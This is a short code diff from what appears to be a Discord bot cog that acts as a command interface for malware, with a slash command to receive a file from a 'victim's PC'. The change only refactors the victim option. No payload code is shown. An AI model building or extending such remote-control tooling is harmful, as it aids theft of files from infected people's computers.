@@ -13,7 +13,7 @@ class ReceiveFiles(commands.Cog):
     @commands.slash_command(
         description="Receives file from victim's PC",
         options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
+            self.bot.victim,
             discord.Option("file_path", description="Path of the file for receiving", required=True),
         ]
     )
